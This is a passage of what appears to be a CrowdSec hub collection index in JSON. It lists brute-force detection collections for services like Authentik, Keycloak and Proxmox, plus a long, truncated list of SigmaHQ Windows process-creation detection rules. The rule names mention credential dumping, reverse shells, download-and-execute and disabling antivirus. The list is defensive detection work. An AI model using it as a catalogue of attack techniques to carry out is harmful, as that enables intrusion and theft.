"0.1", "versions": {"0.1": {"digest": "23dcbf45a7677927d72361f7d0d0210763fd1e4bc019c276b98092966ab14b5c"}}}, "firix/authentik": {"content": "parsers:\n  - firix/authentik-logs\nscenarios:\n  - firix/authentik-bf\ncollections:\ndescription: \"Authentik Support : parser and brute-force detection\"\nauthor: firix\ntags:\n  - linux\n  - brute-force\n  - authentik\n", "description": "Authentik Support : parser and brute-force detection", "parsers": ["firix/authentik-logs"], "path": "collections/firix/authentik.yaml", "scenarios": ["firix/authentik-bf"], "version": "0.1", "versions": {"0.1": {"digest": "3aad9afc16c8be4f1480f3dfbf7b992a571e065cf535775a891c657d67ddbec6"}}}, "fulljackz/proxmox": {"content": "parsers:\n  - crowdsecurity/syslog-logs\n  - fulljackz/proxmox-logs\nscenarios:\n  - fulljackz/proxmox-bf\ndescription: \"Proxmox Web interface support : parser for brute force detection on Proxmox VE Web UI\"\nauthor: fulljackz\ntags:\n  - Proxmox \n  - bruteforce\n\n", "description": "Proxmox Web interface support : parser for brute force detection on Proxmox VE Web UI", "parsers": ["crowdsecurity/syslog-logs", "fulljackz/proxmox-logs"], "path": "collections/fulljackz/proxmox.yaml", "scenarios": ["fulljackz/proxmox-bf"], "version": "0.1", "versions": {"0.1": {"digest": "a671536baca4ae612eede90a29e39e7079a03d4d16fea9a534fab79c50b30deb"}}}, "fulljackz/pureftpd": {"content": "parsers:\n  - crowdsecurity/syslog-logs\n  - fulljackz/pureftpd-logs\nscenarios:\n  - fulljackz/pureftpd-bf\ndescription: \"Pureftpd support : parser for brute force detection on Pureftpd\"\nauthor: fulljackz\ntags:\n  - Pureftpd\n  - bruteforce\n\n", "description": "Pureftpd support : parser for brute force detection on Pureftpd", "parsers": ["crowdsecurity/syslog-logs", "fulljackz/pureftpd-logs"], "path": "collections/fulljackz/pureftpd.yaml", "scenarios": ["fulljackz/pureftpd-bf"], "version": "0.1", "versions": {"0.1": {"digest": "efffdc3d30f38ea0e236f6fe55d0997b046ab25f44bef64fbf37ab5fb9b184ed"}}}, "gauth-fr/immich": {"content": "parsers:\n  - gauth-fr/immich-logs\nscenarios:\n  - gauth-fr/immich-bf\ndescription: \"Immich support : parser and brute-force detection\"\nauthor: gauth-fr\ntags:\n  - linux\n  - brute-force\n  - immich\n", "description": "Immich support : parser and brute-force detection", "parsers": ["gauth-fr/immich-logs"], "path": "collections/gauth-fr/immich.yml", "scenarios": ["gauth-fr/immich-bf"], "version": "0.1", "versions": {"0.1": {"digest": "b18a419be300518ec1c82139f892af0d854dda2ff38ef13310568d48f632d5d1"}}}, "hitech95/nginx-mail": {"content": "parsers:\n  - hitech95/nginx-mail-logs\nscenarios:\n  - hitech95/mail-generic-bf\ndescription: \"nginx email core : parser and spammer detection\"\nauthor: hitech95\ntags:\n  - linux\n  - spam\n  - bruteforce\n  - email\n", "description": "nginx email core : parser and spammer detection", "parsers": ["hitech95/nginx-mail-logs"], "path": "collections/hitech95/nginx-mail.yaml", "scenarios": ["hitech95/mail-generic-bf"], "version": "0.1", "versions": {"0.1": {"digest": "0dd42652366dd9cc2dcdc8bee7977cc45b51fba865796fb699b0bf5ca010d736"}}}, "inherent-io/keycloak": {"content": "parsers:\n  - inherent-io/keycloak-logs\nscenarios:\n  - inherent-io/keycloak-bf\n  - inherent-io/keycloak-slow-bf\ndescription: \"Keycloak support : parser and brute-force detection\"\nauthor: inherent-io\ntags:\n  - keycloak\n  - bruteforce\n", "description": "Keycloak support : parser and brute-force detection", "parsers": ["inherent-io/keycloak-logs"], "path": "collections/inherent-io/keycloak.yaml", "scenarios": ["inherent-io/keycloak-bf", "inherent-io/keycloak-slow-bf"], "version": "0.2", "versions": {"0.1": {"digest": "b57e28a782a618fd349ddba5deb1af5795dc75e72022b443de287ec98ec6daa0"}, "0.2": {"digest": "f3ddcd12543d906393577d99474efffe23262d640dce5f7b405de93794cc6627"}}}, "jbowdre/miniflux": {"content": "parsers:\n  - jbowdre/miniflux-logs\nscenarios:\n  - jbowdre/miniflux-bf\ndescription: \"Miniflux support : parser and brute-force detection\"\nauthor: jbowdre\ntags:\n  - linux\n  - brute-force\n  - miniflux\n", "description": "Miniflux support : parser and brute-force detection", "parsers": ["jbowdre/miniflux-logs"], "path": "collections/jbowdre/miniflux.yml", "scenarios": ["jbowdre/miniflux-bf"], "version": "0.1", "versions": {"0.1": {"digest": "cbee1547c09e002b2030a6b59a8b706fdd222e79f38c0fadaa46380f53735262"}}}, "jusabatier/apereo-cas": {"content": "parsers:\n  - jusabatier/apereo-cas-audit-logs\nscenarios:\n  - jusabatier/apereo-cas-bf\n  - jusabatier/apereo-cas-slow-bf\ndescription: \"APEREO-CAS support : parser and brute-force detection\"\nauthor: jusabatier\ntags:\n  - Apereo CAS\n  - bruteforce\n", "description": "APEREO-CAS support : parser and brute-force detection", "parsers": ["jusabatier/apereo-cas-audit-logs"], "path": "collections/jusabatier/apereo-cas.yaml", "scenarios": ["jusabatier/apereo-cas-bf", "jusabatier/apereo-cas-slow-bf"], "version": "0.1", "versions": {"0.1": {"digest": "44e11d3facd2d5ff4b39d72367f688a1dc995270dd78b30ca9226e0a0b70ad3f"}}}, "lourys/pterodactyl": {"content": "parsers:\n  - lourys/pterodactyl-wings-logs\ncollections:\nscenarios:\n  - lourys/pterodactyl-wings-bf\ndescription: \"pterodactyl wings support : parser and generic wings bruteforce\"\nauthor: lourys\ntags:\n  - pterodactyl\n  - wings\n  - brute-force\n", "description": "pterodactyl wings support : parser and generic wings bruteforce", "parsers": ["lourys/pterodactyl-wings-logs"], "path": "collections/lourys/pterodactyl.yaml", "scenarios": ["lourys/pterodactyl-wings-bf"], "version": "0.1", "versions": {"0.1": {"digest": "081021627594cbedcd4523e84b910f71f113feb36f3de50acd1474dd94985916"}}}, "mstilkerich/bind9": {"content": "parsers:\n  - mstilkerich/bind9-logs\nscenarios:\n  - mstilkerich/bind9-refused\ndescription: \"bind9 support : security policy violations detection\"\nauthor: mstilkerich\ntags:\n  - linux\n", "description": "bind9 support : security policy violations detection", "parsers": ["mstilkerich/bind9-logs"], "path": "collections/mstilkerich/bind9.yaml", "scenarios": ["mstilkerich/bind9-refused"], "version": "0.1", "versions": {"0.1": {"digest": "4ee8361d2f94b53c29a518291fbf548d6fdd336c1dee37942d2c305771796957"}}}, "mwinters-stuff/mailu-admin": {"content": "parsers:\n  - mwinters-stuff/mailu-admin-logs\nscenarios:\n  - mwinters-stuff/mailu-admin-bf\ndescription: \"mailu admin support : parser and scenario\"\nauthor: mwinters-stuff\ntags:\n  - linux\n  - mailu\n", "description": "mailu admin support : parser and scenario", "parsers": ["mwinters-stuff/mailu-admin-logs"], "path": "collections/mwinters-stuff/mailu-admin.yaml", "scenarios": ["mwinters-stuff/mailu-admin-bf"], "version": "0.2", "versions": {"0.1": {"digest": "a3921dac9fd22d94069f6ae0dabaf00b26777e36467100077e3c1b3336c86d52"}, "0.2": {"digest": "166621702256cf4adc70f359ec7a6921ef139bd26f10699d77a4abeb6a487487"}}}, "openappsec/openappsec": {"content": "parsers:\n  - openappsec/openappsec-logs\nscenarios:\n  - openappsec/openappsec-ldap-injection\n  - openappsec/openappsec-path-traversal\n  - openappsec/openappsec-probing\n  - openappsec/openappsec-rce\n  - openappsec/openappsec-sql-injection\n  - openappsec/openappsec-xss\n  - openappsec/openappsec-xxe\n  - openappsec/openappsec-url-instead-of-file\n  - openappsec/openappsec-schema-validation\n  - openappsec/openappsec-request-rate-limit\n  - openappsec/openappsec-open-redirect\n  - openappsec/openappsec-http-method-violation\n  - openappsec/openappsec-http-limit-violation\n  - openappsec/openappsec-general\n  - openappsec/openappsec-evasion-techniques\n  - openappsec/openappsec-error-disclosure\n  - openappsec/openappsec-error-limit\n  - openappsec/openappsec-csrf\n  - openappsec/openappsec-bot-protection\n  - openappsec/openappsec-cross-site-redirect\ndescription: \"open-appsec support : open-appsec parser and scenarios\"\nauthor: openappsec\ntags:\n  - linux\n  - web\n  - waf", "description": "open-appsec support : open-appsec parser and scenarios", "parsers": ["openappsec/openappsec-logs"], "path": "collections/openappsec/openappsec.yaml", "scenarios": ["openappsec/openappsec-ldap-injection", "openappsec/openappsec-path-traversal", "openappsec/openappsec-probing", "openappsec/openappsec-rce", "openappsec/openappsec-sql-injection", "openappsec/openappsec-xss", "openappsec/openappsec-xxe", "openappsec/openappsec-url-instead-of-file", "openappsec/openappsec-schema-validation", "openappsec/openappsec-request-rate-limit", "openappsec/openappsec-open-redirect", "openappsec/openappsec-http-method-violation", "openappsec/openappsec-http-limit-violation", "openappsec/openappsec-general", "openappsec/openappsec-evasion-techniques", "openappsec/openappsec-error-disclosure", "openappsec/openappsec-error-limit", "openappsec/openappsec-csrf", "openappsec/openappsec-bot-protection", "openappsec/openappsec-cross-site-redirect"], "version": "0.1", "versions": {"0.1": {"digest": "c940f93ab8715abf6788e3052596e1c279ae59689d50aaecc4be693e05b603a2"}}}, "plague-doctor/audiobookshelf": {"content": "parsers:\n    - plague-doctor/audiobookshelf-logs\nscenarios:\n    - plague-doctor/audiobookshelf-bf\ndescription: \"Audiobookshelf: parser and brute-force detection\"\nauthor: plague-doctor\ntags:\n    - linux\n    - brute-force\n    - audiobookshelf\n", "description": "Audiobookshelf: parser and brute-force detection", "parsers": ["plague-doctor/audiobookshelf-logs"], "path": "collections/plague-doctor/audiobookshelf.yaml", "scenarios": ["plague-doctor/audiobookshelf-bf"], "version": "0.1", "versions": {"0.1": {"digest": "d2e2afd09a10c004b7dd9f1c5be07c1237fc5f1bd9ec339ae374521c6313661b"}}}, "pserranoa/openvpn": {"content": "author: pserranoa\ndescription: 'Collection to detect failed authentications for OpenVPN'\nparsers:\n- pserranoa/openvpn\nscenarios:\n- pserranoa/openvpn-bf\ntags:\n  - openvpn\n  - bruteforce", "description": "Collection to detect failed authentications for OpenVPN", "parsers": ["pserranoa/openvpn"], "path": "collections/pserranoa/openvpn.yml", "scenarios": ["pserranoa/openvpn-bf"], "version": "0.1", "versions": {"0.1": {"digest": "de1d699318182e4c08503b63a0ffd281196fbb1dd1a74f38ac9f1426ef8c738f"}}}, "schiz0phr3ne/prowlarr": {"content": "parsers:\n  - schiz0phr3ne/prowlarr-logs\nscenarios:\n  - schiz0phr3ne/prowlarr-bf\ndescription: \"Prowlarr support: parser and brute-force detections\"\nauthor: schiz0phr3ne\ntags:\n  - linux\n  - brute-force\n  - prowlarr\n", "description": "Prowlarr support: parser and brute-force detections", "parsers": ["schiz0phr3ne/prowlarr-logs"], "path": "collections/schiz0phr3ne/prowlarr.yaml", "scenarios": ["schiz0phr3ne/prowlarr-bf"], "version": "0.1", "versions": {"0.1": {"digest": "3b125f7cb02336af4db16850ba14589f3976f4a9907ac18d568e50a61d6b1bbf"}}}, "schiz0phr3ne/radarr": {"content": "parsers:\n  - schiz0phr3ne/radarr-logs\nscenarios:\n  - schiz0phr3ne/radarr-bf\ndescription: \"Radarr support: parser and brute-force detections\"\nauthor: schiz0phr3ne\ntags:\n  - linux\n  - brute-force\n  - radarr\n", "description": "Radarr support: parser and brute-force detections", "parsers": ["schiz0phr3ne/radarr-logs"], "path": "collections/schiz0phr3ne/radarr.yaml", "scenarios": ["schiz0phr3ne/radarr-bf"], "version": "0.1", "versions": {"0.1": {"digest": "577bcb650cb6069a638290703064efa15884614a3ba4736feae2adc37033a4dd"}}}, "schiz0phr3ne/sonarr": {"content": "parsers:\n  - schiz0phr3ne/sonarr-logs\nscenarios:\n  - schiz0phr3ne/sonarr-bf\ndescription: \"Sonarr support: parser and brute-force detections\"\nauthor: schiz0phr3ne\ntags:\n  - linux\n  - brute-force\n  - sonarr\n", "description": "Sonarr support: parser and brute-force detections", "parsers": ["schiz0phr3ne/sonarr-logs"], "path": "collections/schiz0phr3ne/sonarr.yaml", "scenarios": ["schiz0phr3ne/sonarr-bf"], "version": "0.1", "versions": {"0.1": {"digest": "5a354d90be668eccf6b4c63e176778cb732c01641738a0b4a350ad3556c1fc3b"}}}, "sdwilsh/navidrome": {"content": "---\nauthor: sdwilsh\ndescription: \"Navidrome Support : parser and brute-force detection\"\nparsers:\n  - sdwilsh/navidrome-logs\nscenarios:\n  - sdwilsh/navidrome-bf\ntags:\n  - navidrome\n  - brute-force\n", "description": "Navidrome Support : parser and brute-force detection", "parsers": ["sdwilsh/navidrome-logs"], "path": "collections/sdwilsh/navidrome.yml", "scenarios": ["sdwilsh/navidrome-bf"], "version": "0.1", "versions": {"0.1": {"digest": "8c637e94ddf18aa27d0c021010acb846f242967cb4c41a8d4febecbee267a793"}}}, "sigmahq/windows_proc_creation": {"content": "parsers:\n - crowdsecurity/sysmon-logs\ncontexts:\n - crowdsecurity/sysmon_base\nscenarios:\n - sigmahq/proc_creation_win_addinutil_suspicious_cmdline\n - sigmahq/proc_creation_win_adplus_memory_dump\n - sigmahq/proc_creation_win_agentexecutor_susp_usage\n - sigmahq/proc_creation_win_aspnet_compiler_susp_child_process\n - sigmahq/proc_creation_win_aspnet_compiler_susp_paths\n - sigmahq/proc_creation_win_at_interactive_execution\n - sigmahq/proc_creation_win_attrib_system_susp_paths\n - sigmahq/proc_creation_win_auditpol_nt_resource_kit_usage\n - sigmahq/proc_creation_win_auditpol_susp_execution\n - sigmahq/proc_creation_win_bcdedit_boot_conf_tamper\n - sigmahq/proc_creation_win_bginfo_suspicious_child_process\n - sigmahq/proc_creation_win_bitsadmin_download_direct_ip\n - sigmahq/proc_creation_win_bitsadmin_download_susp_extensions\n - sigmahq/proc_creation_win_bitsadmin_download_susp_targetfolder\n - sigmahq/proc_creation_win_browsers_chromium_headless_debugging\n - sigmahq/proc_creation_win_browsers_chromium_headless_file_download\n - sigmahq/proc_creation_win_browsers_chromium_mockbin_abuse\n - sigmahq/proc_creation_win_browsers_chromium_susp_load_extension\n - sigmahq/proc_creation_win_browsers_tor_execution\n - sigmahq/proc_creation_win_calc_uncommon_exec\n - sigmahq/proc_creation_win_certoc_download_direct_ip\n - sigmahq/proc_creation_win_certoc_load_dll_susp_locations\n - sigmahq/proc_creation_win_certutil_download_direct_ip\n - sigmahq/proc_creation_win_certutil_ntlm_coercion\n - sigmahq/proc_creation_win_citrix_trolleyexpress_procdump\n - sigmahq/proc_creation_win_cmd_assoc_tamper_exe_file_association\n - sigmahq/proc_creation_win_cmd_copy_dmp_from_share\n - sigmahq/proc_creation_win_cmd_curl_download_exec_combo\n - sigmahq/proc_creation_win_cmdkey_recon\n - sigmahq/proc_creation_win_cmd_mklink_osk_cmd\n - sigmahq/proc_creation_win_cmd_mklink_shadow_copies_access_symlink\n - sigmahq/proc_creation_win_cmd_net_use_and_exec_combo\n - sigmahq/proc_creation_win_cmd_no_space_execution\n - sigmahq/proc_creation_win_cmd_ntdllpipe_redirect\n - sigmahq/proc_creation_win_cmd_path_traversal\n - sigmahq/proc_creation_win_cmd_ping_del_combined_execution\n - sigmahq/proc_creation_win_cmd_shadowcopy_access\n - sigmahq/proc_creation_win_cmd_sticky_key_like_backdoor_execution\n - sigmahq/proc_creation_win_cmd_sticky_keys_replace\n - sigmahq/proc_creation_win_cmstp_execution_by_creation\n - sigmahq/proc_creation_win_conhost_path_traversal\n - sigmahq/proc_creation_win_control_panel_item\n - sigmahq/proc_creation_win_createdump_lolbin_execution\n - sigmahq/proc_creation_win_csc_susp_parent\n - sigmahq/proc_creation_win_csi_use_of_csharp_console\n - sigmahq/proc_creation_win_curl_download_direct_ip_susp_extensions\n - sigmahq/proc_creation_win_curl_susp_download\n - sigmahq/proc_creation_win_dctask64_arbitrary_command_and_dll_execution\n - sigmahq/proc_creation_win_desktopimgdownldr_susp_execution\n - sigmahq/proc_creation_win_dism_enable_powershell_web_access_feature\n - sigmahq/proc_creation_win_dllhost_no_cli_execution\n - sigmahq/proc_creation_win_dll_sideload_vmware_xfer\n - sigmahq/proc_creation_win_dnscmd_install_new_server_level_plugin_dll\n - sigmahq/proc_creation_win_dns_exfiltration_tools_execution\n - sigmahq/proc_creation_win_dns_susp_child_process\n - sigmahq/proc_creation_win_driverquery_recon\n - sigmahq/proc_creation_win_dtrace_kernel_dump\n - sigmahq/proc_creation_win_dump64_defender_av_bypass_rename\n - sigmahq/proc_creation_win_dumpminitool_susp_execution\n - sigmahq/proc_creation_win_esentutl_sensitive_file_copy\n - sigmahq/proc_creation_win_eventvwr_susp_child_process\n - sigmahq/proc_creation_win_explorer_nouaccheck\n - sigmahq/proc_creation_win_findstr_gpp_passwords\n - sigmahq/proc_creation_win_findstr_sysmon_discovery_via_default_altitude\n - sigmahq/proc_creation_win_finger_execution\n - sigmahq/proc_creation_win_fltmc_unload_driver_sysmon\n - sigmahq/proc_creation_win_forfiles_child_process_masquerading\n - sigmahq/proc_creation_win_format_uncommon_filesystem_load\n - sigmahq/proc_creation_win_fsutil_usage\n - sigmahq/proc_creation_win_googleupdate_susp_child_process\n - sigmahq/proc_creation_win_gpg4win_susp_location\n - sigmahq/proc_creation_win_gup_download\n - sigmahq/proc_creation_win_gup_suspicious_execution\n - sigmahq/proc_creation_win_hh_html_help_susp_child_process\n - sigmahq/proc_creation_win_hh_susp_execution\n - sigmahq/proc_creation_win_hktl_adcspwn\n - sigmahq/proc_creation_win_hktl_bloodhound_sharphound\n - sigmahq/proc_creation_win_hktl_c3_rundll32_pattern\n - sigmahq/proc_creation_win_hktl_certify\n - sigmahq/proc_creation_win_hktl_certipy\n - sigmahq/proc_creation_win_hktl_cobaltstrike_bloopers_cmd\n - sigmahq/proc_creation_win_hktl_cobaltstrike_bloopers_modules\n - sigmahq/proc_creation_win_hktl_cobaltstrike_load_by_rundll32\n - sigmahq/proc_creation_win_hktl_cobaltstrike_process_patterns\n - sigmahq/proc_creation_win_hktl_covenant\n - sigmahq/proc_creation_win_hktl_crackmapexec_execution_patterns\n - sigmahq/proc_creation_win_hktl_crackmapexec_execution\n - sigmahq/proc_creation_win_hktl_crackmapexec_patterns\n - sigmahq/proc_creation_win_hktl_crackmapexec_powershell_obfuscation\n - sigmahq/proc_creation_win_hktl_createminidump\n - sigmahq/proc_creation_win_hktl_dinjector\n - sigmahq/proc_creation_win_hktl_dumpert\n - sigmahq/proc_creation_win_hktl_edrsilencer\n - sigmahq/proc_creation_win_hktl_empire_powershell_launch\n - sigmahq/proc_creation_win_hktl_empire_powershell_uac_bypass\n - sigmahq/proc_creation_win_hktl_execution_via_imphashes\n - sigmahq/proc_creation_win_hktl_execution_via_pe_metadata\n - sigmahq/proc_creation_win_hktl_gmer\n - sigmahq/proc_creation_win_hktl_handlekatz\n - sigmahq/proc_creation_win_hktl_hashcat\n - sigmahq/proc_creation_win_hktl_htran_or_natbypass\n - sigmahq/proc_creation_win_hktl_hydra\n - sigmahq/proc_creation_win_hktl_impacket_lateral_movement\n - sigmahq/proc_creation_win_hktl_impacket_tools\n - sigmahq/proc_creation_win_hktl_inveigh\n - sigmahq/proc_creation_win_hktl_invoke_obfuscation_clip\n - sigmahq/proc_creation_win_hktl_invoke_obfuscation_obfuscated_iex_commandline\n - sigmahq/proc_creation_win_hktl_invoke_obfuscation_stdin\n - sigmahq/proc_creation_win_hktl_invoke_obfuscation_var\n - sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_stdin\n - sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_use_clip\n - sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta\n - sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_var\n - sigmahq/proc_creation_win_hktl_koadic\n - sigmahq/proc_creation_win_hktl_krbrelayup\n - sigmahq/proc_creation_win_hktl_krbrelay\n - sigmahq/proc_creation_win_hktl_localpotato\n - sigmahq/proc_creation_win_hktl_meterpreter_getsystem\n - sigmahq/proc_creation_win_hktl_mimikatz_command_line\n - sigmahq/proc_creation_win_hktl_pchunter\n - sigmahq/proc_creation_win_hktl_powersploit_empire_default_schtasks\n - sigmahq/proc_creation_win_hktl_powertool\n - sigmahq/proc_creation_win_hktl_purplesharp_indicators\n - sigmahq/proc_creation_win_hktl_pypykatz\n - sigmahq/proc_creation_win_hktl_quarks_pwdump\n - sigmahq/proc_creation_win_hktl_redmimicry_winnti_playbook\n - sigmahq/proc_creation_win_hktl_relay_attacks_tools\n - sigmahq/proc_creation_win_hktl_rubeus\n - sigmahq/proc_creation_win_hktl_safetykatz\n - sigmahq/proc_creation_win_hktl_secutyxploded\n - sigmahq/proc_creation_win_hktl_selectmyparent\n - sigmahq/proc_creation_win_hktl_sharp_chisel\n - sigmahq/proc_creation_win_hktl_sharpersist\n - sigmahq/proc_creation_win_hktl_sharpevtmute\n - sigmahq/proc_creation_win_hktl_sharp_impersonation\n - sigmahq/proc_creation_win_hktl_sharpldapwhoami\n - sigmahq/proc_creation_win_hktl_sharpup\n - sigmahq/proc_creation_win_hktl_sharpview\n - sigmahq/proc_creation_win_hktl_silenttrinity_stager\n - sigmahq/proc_creation_win_hktl_sliver_c2_execution_pattern\n - sigmahq/proc_creation_win_hktl_stracciatella_execution\n - sigmahq/proc_creation_win_hktl_sysmoneop\n - sigmahq/proc_creation_win_hktl_trufflesnout\n - sigmahq/proc_creation_win_hktl_uacme\n - sigmahq/proc_creation_win_hktl_wce\n - sigmahq/proc_creation_win_hktl_winpeas\n - sigmahq/proc_creation_win_hktl_winpwn\n - sigmahq/proc_creation_win_hktl_wmiexec_default_powershell\n - sigmahq/proc_creation_win_hktl_xordump\n - sigmahq/proc_creation_win_hwp_exploits\n - sigmahq/proc_creation_win_ieexec_download\n - sigmahq/proc_creation_win_iis_appcmd_http_logging\n - sigmahq/proc_creation_win_iis_appcmd_service_account_password_dumped\n - sigmahq/proc_creation_win_iis_connection_strings_decryption\n - sigmahq/proc_creation_win_iis_susp_module_registration\n - sigmahq/proc_creation_win_imagingdevices_unusual_parents\n - sigmahq/proc_creation_win_imewbdld_download\n - sigmahq/proc_creation_win_java_keytool_susp_child_process\n - sigmahq/proc_creation_win_java_manageengine_susp_child_process\n - sigmahq/proc_creation_win_kavremover_uncommon_execution\n - sigmahq/proc_creation_win_logman_disable_eventlog\n - sigmahq/proc_creation_win_lolbin_devtoolslauncher\n - sigmahq/proc_creation_win_lolbin_manage_bde\n - sigmahq/proc_creation_win_lolbin_mavinject_process_injection\n - sigmahq/proc_creation_win_lolbin_mpiexec\n - sigmahq/proc_creation_win_lolbin_msdt_answer_file\n - sigmahq/proc_creation_win_lolbin_openwith\n - sigmahq/proc_creation_win_lolbin_pcwrun_follina\n - sigmahq/proc_creation_win_lolbin_printbrm\n - sigmahq/proc_creation_win_lolbin_settingsynchost\n - sigmahq/proc_creation_win_lolbin_susp_certreq_download\n - sigmahq/proc_creation_win_lolbin_susp_grpconv\n - sigmahq/proc_creation_win_lolbin_tttracer_mod_load\n - sigmahq/proc_creation_win_lolbin_visual_basic_compiler\n - sigmahq/proc_creation_win_lsass_process_clone\n - sigmahq/proc_creation_win_mmc_mmc20_lateral_movement\n - sigmahq/proc_creation_win_mmc_susp_child_process\n - sigmahq/proc_creation_win_mofcomp_execution\n - sigmahq/proc_creation_win_mpcmdrun_dll_sideload_defender\n - sigmahq/proc_creation_win_mpcmdrun_download_arbitrary_file\n - sigmahq/proc_creation_win_mpcmdrun_remove_windows_defender_definition\n - sigmahq/proc_creation_win_msdt_arbitrary_command_execution\n - sigmahq/proc_creation_win_msdt_susp_parent\n - sigmahq/proc_creation_win_mshta_http\n - sigmahq/proc_creation_win_mshta_javascript\n - sigmahq/proc_creation_win_mshta_lethalhta_technique\n - sigmahq/proc_creation_win_mshta_susp_child_processes\n - sigmahq/proc_creation_win_mshta_susp_execution\n - sigmahq/proc_creation_win_mshta_susp_pattern\n - sigmahq/proc_creation_win_msiexec_masquerading\n - sigmahq/proc_creation_win_msra_process_injection\n - sigmahq/proc_creation_win_mssql_susp_child_process\n - sigmahq/proc_creation_win_mssql_veaam_susp_child_processes\n - sigmahq/proc_creation_win_mstsc_rdp_hijack_shadowing\n - sigmahq/proc_creation_win_mstsc_run_local_rdp_file_susp_location\n - sigmahq/proc_creation_win_mstsc_run_local_rpd_file_susp_parent\n - sigmahq/proc_creation_win_msxsl_remote_execution\n - sigmahq/proc_creation_win_netsh_fw_allow_program_in_susp_location\n - sigmahq/proc_creation_win_netsh_fw_allow_rdp\n - sigmahq/proc_creation_win_netsh_port_forwarding_3389\n - sigmahq/proc_creation_win_net_use_mount_internet_share\n - sigmahq/proc_creation_win_net_user_add_never_expire\n - sigmahq/proc_creation_win_net_user_default_accounts_manipulation\n - sigmahq/proc_creation_win_node_abuse\n - sigmahq/proc_creation_win_nslookup_domain_discovery\n - sigmahq/proc_creation_win_odbcconf_driver_install_susp\n - sigmahq/proc_creation_win_odbcconf_exec_susp_locations\n - sigmahq/proc_creation_win_odbcconf_register_dll_regsvr_susp\n - sigmahq/proc_creation_win_office_arbitrary_cli_download\n - sigmahq/proc_creation_win_office_excel_dcom_lateral_movement\n - sigmahq/proc_creation_win_office_exec_from_trusted_locations\n - sigmahq/proc_creation_win_office_onenote_embedded_script_execution\n - sigmahq/proc_creation_win_office_onenote_susp_child_processes\n - sigmahq/proc_creation_win_office_outlook_enable_unsafe_client_mail_rules\n - sigmahq/proc_creation_win_office_outlook_execution_from_temp\n - sigmahq/proc_creation_win_office_outlook_susp_child_processes_remote\n - sigmahq/proc_creation_win_office_outlook_susp_child_processes\n - sigmahq/proc_creation_win_office_spawn_exe_from_users_directory\n - sigmahq/proc_creation_win_office_susp_child_processes\n - sigmahq/proc_creation_win_ping_hex_ip\n - sigmahq/proc_creation_win_plink_port_forwarding\n - sigmahq/proc_creation_win_plink_susp_tunneling\n - sigmahq/proc_creation_win_powershell_aadinternals_cmdlets_execution\n - sigmahq/proc_creation_win_powershell_amsi_init_failed_bypass\n - sigmahq/proc_creation_win_powershell_base64_encoded_cmd_patterns\n - sigmahq/proc_creation_win_powershell_base64_encoded_cmd\n - sigmahq/proc_creation_win_powershell_base64_encoded_obfusc\n - sigmahq/proc_creation_win_powershell_base64_frombase64string\n - sigmahq/proc_creation_win_powershell_base64_hidden_flag\n - sigmahq/proc_creation_win_powershell_base64_iex\n - sigmahq/proc_creation_win_powershell_base64_invoke\n - sigmahq/proc_creation_win_powershell_base64_mppreference\n - sigmahq/proc_creation_win_powershell_base64_reflection_assembly_load_obfusc\n - sigmahq/proc_creation_win_powershell_base64_reflection_assembly_load\n - sigmahq/proc_creation_win_powershell_base64_wmi_classes\n - sigmahq/proc_creation_win_powershell_cmdline_reversed_strings\n - sigmahq/proc_creation_win_powershell_cmdline_special_characters\n - sigmahq/proc_creation_win_powershell_decrypt_pattern\n - sigmahq/proc_creation_win_powershell_defender_disable_feature\n - sigmahq/proc_creation_win_powershell_disable_defender_av_security_monitoring\n - sigmahq/proc_creation_win_powershell_disable_ie_features\n - sigmahq/proc_creation_win_powershell_download_cradle_obfuscated\n - sigmahq/proc_creation_win_powershell_download_iex\n - sigmahq/proc_creation_win_powershell_email_exfil\n - sigmahq/proc_creation_win_powershell_frombase64string\n - sigmahq/proc_creation_win_powershell_getprocess_lsass\n - sigmahq/proc_creation_win_powershell_hide_services_via_set_service\n - sigmahq/proc_creation_win_powershell_iex_patterns\n - sigmahq/proc_creation_win_powershell_import_cert_susp_locations\n - sigmahq/proc_creation_win_powershell_mailboxexport_share\n - sigmahq/proc_creation_win_powershell_obfuscation_via_utf8\n - sigmahq/proc_creation_win_powershell_public_folder\n - sigmahq/proc_creation_win_powershell_remotefxvgpudisablement_abuse\n - sigmahq/proc_creation_win_powershell_remove_mppreference\n - sigmahq/proc_creation_win_powershell_reverse_shell_connection\n - sigmahq/proc_creation_win_powershell_run_script_from_ads\n - sigmahq/proc_creation_win_powershell_run_script_from_input_stream\n - sigmahq/proc_creation_win_powershell_sam_access\n - sigmahq/proc_creation_win_powershell_service_dacl_modification_set_service\n - sigmahq/proc_creation_win_powershell_set_acl_susp_location\n - sigmahq/proc_creation_win_powershell_set_acl\n - sigmahq/proc_creation_win_powershell_shadowcopy_deletion\n - sigmahq/proc_creation_win_powershell_snapins_hafnium\n - sigmahq/proc_creation_win_powershell_susp_download_patterns\n - sigmahq/proc_creation_win_powershell_susp_parameter_variation\n - sigmahq/proc_creation_win_powershell_susp_parent_process\n - sigmahq/proc_creation_win_powershell_susp_ps_downloadfile\n - sigmahq/proc_creation_win_powershell_token_obfuscation\n - sigmahq/proc_creation_win_powershell_webclient_casing\n - sigmahq/proc_creation_win_provlaunch_susp_child_process\n - sigmahq/proc_creation_win_pua_3proxy_execution\n - sigmahq/proc_creation_win_pua_adfind_enumeration\n - sigmahq/proc_creation_win_pua_adfind_susp_usage\n - sigmahq/proc_creation_win_pua_advancedrun_priv_user\n - sigmahq/proc_creation_win_pua_chisel\n - sigmahq/proc_creation_win_pua_cleanwipe\n - sigmahq/proc_creation_win_pua_crassus\n - sigmahq/proc_creation_win_pua_csexec\n - sigmahq/proc_creation_win_pua_defendercheck\n - sigmahq/proc_creation_win_pua_ditsnap\n - sigmahq/proc_creation_win_pua_frp\n - sigmahq/proc_creation_win_pua_iox\n - sigmahq/proc_creation_win_pua_netcat\n - sigmahq/proc_creation_win_pua_ngrok\n - sigmahq/proc_creation_win_pua_nimgrab\n - sigmahq/proc_creation_win_pua_nircmd_as_system\n - sigmahq/proc_creation_win_pua_nps\n - sigmahq/proc_creation_win_pua_nsudo\n - sigmahq/proc_creation_win_pua_rclone_execution\n - sigmahq/proc_creation_win_pua_runxcmd\n - sigmahq/proc_creation_win_pua_seatbelt\n - sigmahq/proc_creation_win_pua_wsudo_susp_execution\n - sigmahq/proc_creation_win_python_pty_spawn\n - sigmahq/proc_creation_win_rar_compression_with_password\n - sigmahq/proc_creation_win_rar_susp_greedy_compression\n - sigmahq/proc_creation_win_rdrleakdiag_process_dumping\n - 